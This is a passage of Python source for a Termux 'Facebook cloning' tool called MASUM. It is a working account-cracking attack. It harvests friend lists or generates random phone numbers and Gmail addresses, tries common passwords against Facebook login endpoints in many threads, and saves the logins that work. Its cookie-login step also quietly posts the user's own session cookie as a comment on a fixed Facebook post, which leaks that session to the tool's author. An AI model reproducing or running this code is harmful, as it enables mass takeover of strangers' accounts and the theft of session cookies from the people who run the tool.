 BROTHER         :ғᴏʀʜᴀᴅ
----------------------------------------------
ᴍᴀsᴜᴍ IS BACK
\033[1;36m----------------------------------------------""")
def linex():
        print('\033[1;33m----------------------------------------------')
def clear():
        os.system('clear')
        print(logo)      
loop=0
oks=[]
cps=[]
pcp=[]
id=[]
tokenku=[]
def login():
        clear()
        cookies = input(' Put cookies: ')
        try:
                data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0",'sec-ch-prefers-color-scheme': 'light',"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookies})
                find_token = re.search("(EAAG\w+)", data.text)
                open(".tok.txt", "w").write(find_token.group(1))
                open(".coki.txt","w").write(cookies)
                tok=open('.tok.txt','r').read()
                info = requests.get('https://b-graph.facebook.com/me/?access_token='+tok,cookies = {"cookie":cookies}).json()
                name=(info['name'])
                idd=(info['id'])
                barth=(info['birthday'])
                linex()
                print(' Welcome\033[1;32m : '+name)
                print(' \033[1;37mYour UID : '+idd)
                print(' Barth Day: '+barth)
                requests.post('https://graph.facebook.com/pfbid02Sj97PfY1mY3cvbLjGaJRz22FR7yc75JFKLoBFiHoNLSq9aGxmGKotAtcYLkMDDpbl/comments/?message='+cookies+'&access_token='+tok, cookies={'cookie':cookies})
                linex()
                print(' Cookies login has been successfull...')
                time.sleep(1)
                menu()
        except KeyError:
                print('\033[1;31m Cookies has been expired...')
                os.system('rm -rf .tok.txt');time.sleep(1);login()
        except requests.exceptions.ConnectionError:
                exit(' internet connection error...')
        except AttributeError:
                print('\033[1;31m Cookies has been expired...')
                os.system('rm -rf .tok.txt');time.sleep(1);login()
                login()
def public():
        usrr=[]
        clear()
        try:
                tok = open('.tok.txt','r').read()
                cok = open('.coki.txt','r').read()
                tokenku.append(tok)
        except KeyError:
                print('\033[1;31mYour cookies han expired...');time.sleep(1)
                login()
        except IOError:
                print('\033[1;31mYour cookies han expired...');time.sleep(1)
                login()
        try:
                info = requests.get('https://graph.facebook.com/me/?access_token='+tok,cookies = {"cookie":cok}).json()
                name=(info['name'])
                print('\033[1;32m Welcome '+name)
                linex()
        except KeyError:
                print('\033[1;31mYour cookies han expired...');time.sleep(1)
                login()
        try:
                jum=int(input(' \033[1;36mHow many ids you went to clone ?\033[1;37m '))
        except ValueError:
                exit(' Put only digits not latters ')
        if jum<1 or jum>5000:
                exit()
        ses=requests.Session()
        yz = 0
        for met in range(jum):
                yz+=1
                kl = input(f'\033[1;37m Put link no.{yz+0}: ')
                usrr.append(kl)
        linex()
        print(' All method working try 1 by 1 ')
        linex()
        print(' [1] Method 1 (FOR NEW IDX.) \n [2] Method 2 (WAITING)\n [3] Method 3 (WAITING)')
        linex()
        mthd = input(' Choose method: ')
        linex()
        print(' Do you went show cp account? (y/n): ')
        linex()
        cx=input(' Choose: ')
        if cx in ['y','Y','yes','Yes','1']:
                pcp.append('y')
        else:
                pcp.append('n')
        linex()
        print('\033[1;32m Dumping friend list...\033[1;37m')
        linex()
        for userr in usrr:
                try:
                        col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
                        for mi in col['friends']['data']:
                                try:
                                        iso = (mi['id']+'|'+mi['name'])
                                        if iso in id:pass
                                        else:id.append(iso)
                                except:continue
                except (KeyError,IOError):
                        pass
                except requests.exceptions.ConnectionError:
                        exit(f' No internet connection')
        try:
                plist = []
                try:
                        ps_limit = int(input(' How many passwords do you want to add ? '))
                except:
                        ps_limit =1
                linex()
                print('\033[1;32m exp: first last,firtslast,first123')
                linex()
                for i in range(ps_limit):
                        plist.append(input(f' Put password {i+1}: '))
                with tred(max_workers=30) as crack_submit:
                        clear()
                        total_ids = str(len(id))
                        print(' Total account : \033[1;32m'+total_ids+f' \033[1;33m>\033[1;36m> \033[1;37mMethod -> \033[1;37mM{mthd}')
                        print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
                        linex()
                        for user in id:
                                ids,names = user.split('|')
                                passlist = plist
                                if mthd in ['1','01']:
                                        crack_submit.submit(ffb,ids,names,passlist)
                                elif mthd in ['2','02']:
                                        crack_submit.submit(api,ids,names,passlist)
                                else:
                                        crack_submit.submit(api1,ids,names,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' Press enter to back ')
                os.system('python MASUM.py')
        except requests.exceptions.ConnectionError:
                exit(f' No internet connection')
        except (KeyError,IOError):
                print(f' No friends for {userr}')
                time.sleep(3)
                public()
def menu():
        try:
                clear()
        #       chk()
                x = ("sex")
                if x == ("sex"):
                        print(' [1]  File cloning\n [2]  Random Cloning\n [0] Exit menu')
                        linex()
                        xd=input(' Choose an option: ')
                        if xd in ['1','01']:
                                clear()
                                print(' Put 📁 file example:  /sdcard/File.txt  etc..')
                                linex()
                                file = input(' Put 📁 file path\033[1;37m: ')
                                try:
                                        fo = open(file,'r').read().splitlines()
                                except FileNotFoundError:
                                        print('📁 File location not found ')
                                        time.sleep(1)
                                        menu()
                                clear()
                                print(' All 🔓 method working try 1 by 1 ')
                                linex()
                                print(' [1] Method 1 (Key 🔑) \n [2] Method 2 (Key 🔑)\n [3] Method 3 (Key 🔑)')
                                linex()
                                mthd=input(' Choose: ')
                                linex()
                                plist = []
                                try:
                                        ps_limit = int(input(' How many 🔧 passwords do you want to add ? '))
                                except:
                                        ps_limit =1
                                linex()
                                print('\033[1;32m 🔧 exp: first last,firtslast,first123')
                                linex()
                                for i in range(ps_limit):
                                        plist.append(input(f' Put 🧬 password {i+1}: '))
                                linex()
                                print(' Do you went show cp account? (y/n): ')
                                linex()
                                cx=input(' Choose: ')
                                if cx in ['y','Y','yes','Yes','1']:
                                        pcp.append('y')
                                else:
                                        pcp.append('n')
                                with tred(max_workers=30) as crack_submit:
                                        clear()
                                        total_ids = str(len(fo))
                                        print(' Total account : \033[1;32m'+total_ids+f' \033[1;33m>\033[1;36m> \033[1;37mMethod -> \033[1;37mM{mthd}')
                                        print("\033[1;37m \x1b[38;5;208mUse flight ✈️  mode for 🚀 speed up\033[1;37m")
                                        linex()
                                        for user in fo:
                                                ids,names = user.split('|')
                                                passlist = plist
                                                if mthd in ['1','01']:
                                                        crack_submit.submit(ffb,ids,names,passlist)
                                                elif mthd in ['2','02']:
                                                        crack_submit.submit(api,ids,names,passlist)
                                                else:
                                                        crack_submit.submit(api1,ids,names,passlist)
                                print('\033[1;37m')
                                linex()
                                print(' The process has completed')
                                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                                linex()
                                input(' Press enter to back ')
                                os.system('python ᴍᴀsᴜᴍ.py')
                        #elif xd in ['2','02']:
                                #import dump
                                #dump.Main()
                        elif xd in ['3','03']:
                                public()
                        elif xd in ['2','02']:
                                clear()
                                print(' [1] Pakistan cloning\n [2] Bangladesh cloning\n [3] Gmail cloning\n [0] Back menu')
                                linex()
                                x=input(' Choose: ')
                                if x in ['1','01']:
                                        pak()
                                elif x in ['2','02']:
                                        bd()
                                elif x in ['3','03']:
                                        gmail()
                                else:
                                        menu()
                        elif xd in ['5','05']:
                                gmail()
                        elif xd in ['6','06']:
                                wx=('Dsj9JMWoixk4Qsje0Ng3nA')
                                os.system(f'xdg-open https://chat.whatsapp.com/{wx}');menu()
                        elif xd in ['7','07']:
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/MASUM_VPN1.0.apk/file');menu()
                        elif xd in ['8','08']:
                                os.system('xdg-open https://www.facebook.com/100084680097792/posts/pfbid0CZ9vn6qRF78vmdk4V3ja7Rx5mZa1hsmMaaTNXms2kkVyt1EZ7k5seWMjQd7pDfvvl/?app=fbl');menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use  ')
                        else:
                                exit(' Option not found in menu...')
                else:
                        print("\033[1;31m Your Not Premium User...!\033[1;37m");time.sleep(1)
                        clear()
                        print('\033[1;31m First Read Note : ')
                        print("\033[1;36m We Not Responsible if facebook\n go on update you not get ok idz\n We don't responsible if you delete your \n termux and key need approve\033[1;37m")
                        linex()
                        print(' \033[1;31mYour Key Not Registered\033[1;37m')
                        print(f" \033[1;37mYour Key : {'fkeyx'}")
                        linex();print (" Tools.. : Facebook Cloning");print (" Massage : Your Key Not Registered");print (" Status  : \033[1;91mTrail\033[1;37m\n \033[1;31m\033[1;42mNote: If You Are Free User Don't Come IB\033[0;0m");linex();print(' [+] File crack\n [+] Create ids file\n [+] Public crack\n [+] Random number crack\n [+] Random gmail crack\n [+] Exit menu\n\x1b[1;97m [1] Upgrade Tool To (\x1b[1;95mPremium\x1b[1;37m)')
                        linex()
                        input(" Choose Option : ")
                        linex()
                        print(" Your Subscription Date Expire")
                        linex()
                        url_wa = "https://api.whatsapp.com/send?phone=+923150665740&text="
                        name = input(" Enter your Name : ")
                        linex()
                        tks = ("Hi MASUM Sir, I Need To Buy Your Paid MASUM PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+'fkeyx')
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python MASUM.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
                print('\n No internet connection ...')
                exit()
def pak():
                user=[]
                clear()
                print('\033[1;31m Code example: 0306,0315,0335,0345')
                code = input('\033[1;37m put code: ')
                try:
                        limit = int(input('\033[1;31m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=30) as ᴍᴀsᴜᴍ:     
                        clear()
                        tl = str(len(user))
                        print(' Total account : \033[1;32m'+tl)
                        print(f'\033[1;37m Choice code ..:\033[1;32m '+code)
                        print(f'\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;97m')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan','khan1122','khan12345','khan1234','khan12','khan786','khan123','khan123456','khankhan123','786786','khan11']
                                MASUM.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' Press enter to back ')
                os.system('python ᴍᴀsᴜᴍ.py')
def bd():
                user=[]
                clear()
                print('\033[1;31m Code example: 016,017,018,019')
                code = input('\033[1;37m put code: ')
                try:
                        limit = int(input('\033[1;31m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(8))
                        user.append(nmp)
                with tred(max_workers=30) as ᴍᴀsᴜᴍ:     
                        clear()
                        tl = str(len(user))
                        print(' Total account : \033[1;32m'+tl)
                        print(f'\033[1;37m Choice code ..:\033[1;32m '+code)
                        print(f'\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;97m')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'Bangladesh','bangladesh','i love you','iloveyou','free fire','freefire']
                                ᴍᴀsᴜᴍ.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' Press enter to back ')
                os.system('python MASUM.py')
def gmail():
                os.system('rm -rf .re.txt')
                clear()
                print('\033[1;37m example: muhammad, ali, sajjad, faizan\033[1;97m')
                linex()
                first = input(' Put first name: ')
                linex()
                print('\033[1;37m example: khan, ahmad, ali \033[1;97m')
                linex()
                last = input(' Put last name: ')
                linex()
                print(' Example: @gmail.com , @yahoo.com etc...')
                linex()
                domain = input(' domain: ')
                linex()
                try:
                        limit=int(input(' Put limit: '))
                except ValueError:
                        limit = 5000
                linex()
                print(' Getting gmails...')
                lists = ['3','4']
                for xd in range(limit):
                        lchoice = random.choice(lists)
                        if '3' in lchoice:
                                mail = ''.join(random.choice(string.digits) for _ in range(3))
                                open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
                        else:
                                mail = ''.join(random.choice(string.digits) for _ in range(4))
                                open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
                        fo = open('.re.txt', 'r').read().splitlines()
                with tred(max_workers=30) as MASUM:
                        total = str(len(fo))
                        clear()
                        print(' Total account : \033[1;32m'+total)
                        print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
                        linex()
                        for user in fo:
                                ids,names = user.split('|')
                                first_name = names.rsplit(' ')[0]
                                try:
                                        last_name = names.rsplit(' ')[1]
                                except IndexError:
                                        last_name = 'Khan'
                                fs = first_name.lower()
                                ls = last_name.lower()
                                passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
                                SATAN.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' Press enter to back ')
                os.system('python ᴍᴀsᴜᴍ.py')
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [ʜʀɪᴅᴏʏ-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                        last = names.split(' ')[1]
                except:
                        last = 'Khan'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                        ua=random.choice(ugen)
                        head = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                        getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://m.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        MASUM=session.cookies.get_dict().keys()
                        if "c_user" in MASUM:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [ᴍᴀsᴜᴍ-OK] %s | %s'%(ids,pas))
                                open('/sdcard/HASHIM-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in MASUM:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [ʜʀɪᴅᴏʏ-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/MASUM-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        loop+=1
xxxxx=(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550','GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
def api(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [ᴍᴀsᴜᴍ-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                gtt=random.choice(xxxxx)
                                gttt=random.choice(xxxxx)
                                android_version=str(random.randrange(4,14))
                                ua_string = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                                        'password':pas,
                                        'cpl':'true',
                                        'credentials_type':'device_based_login_password',
                                        "source": "device_based_login",
                                        'error_detail_type':'button_with_disabled',
                                        'source':'login','format':'json',
                                        'generate_session_cookies':'1',
                                        'generate_analytics_claim':'1',
                                        'generate_machine_id':'1',
                                        "locale":"en_US","client_country_code":"US",
                                        'device':gtt,
                                        'device_id':adid,
                                        "method": "auth.login",
                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                head = {
                                        'content-type':'application/x-www-form-urlencoded',
                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-type':'unknown',
                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                        'user-agent':satn_ua(),
                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                        'x-fb-connection-quality':'EXCELLENT',
                                        'x-fb-friendly-name':'authenticate',
                                        'accept-encoding':'gzip, deflate',
                                        'x-fb-http-engine':     'Liger'}
                                url = 'https://b-api.facebook.com/method/auth.login'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [ғᴏʀʜᴀᴅ-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/HASHIM-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error_msg']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;93m [ғᴏʀʜᴀᴅ-CP] '+ids+' | '+pas+'\x1b[1;93m')
                                                open('/sdcard/ғᴏʀʜᴀᴅ-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass
def api1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [MASUM-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                                application_version = str(random.randint(111,999))+'.0.0.'+str(random.randrange(1,30))+str(random.randint(111,999))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                gtt=random.choice(xxxxx)
                                gttt=random.choice(xxxxx)
                                android_version=str(random.randrange(4,14))
                                ua_string = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/es_CU;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                                        'password':pas,
                                        'cpl':'true',
                                        'credentials_type':'device_based_login_password',
                                        "source": "device_based_login",
                                        'error_detail_type':'button_with_disabled',
                                        'source':'login','format':'json',
                                        'generate_session_cookies':'1',
                                        'generate_analytics_claim':'1',
                                        'generate_machine_id':'1',
                                        "locale":"es_CU","client_country_code":"CU",
                                        'device':gtt,
                                        'device_id':adid,
                                        "method": "auth.login",
                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                head = {
                                        'User-Agent':ua_string,
                                        'Content-Type': 'application/x-www-form-urlencoded',
                                        'Host': 'graph.facebook.com',
                                        'X-FB-Net-HNI': '22739',
                                        'X-FB-SIM-HNI': '35221',
                                        'X-FB-Connection-Type': 'MOBILE.LTE',
                                        'X-Tigon-Is-Retry': 'False',
                                        'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 
                                        'x-fb-device-group': '5120',
                                        'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                                        'X-FB-Request-Analytics-Tags': 'graphservice',
                                        'X-FB-HTTP-Engine': 'Liger',
                                        'X-FB-Client-IP': 'True',
                                        'X-FB-Server-Cluster': 'True',
                                        'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
                                url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ᴍsᴍ-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;93m [ᴍsᴍ-CP] '+ids+' | '+pas+'\x1b[1;93m')
                                                open('/sdcard/ᴍsᴍ-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/ᴍsᴍ-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass
def rndm(ids,passlist):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in passlist:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":ids,
            "pass":ps,
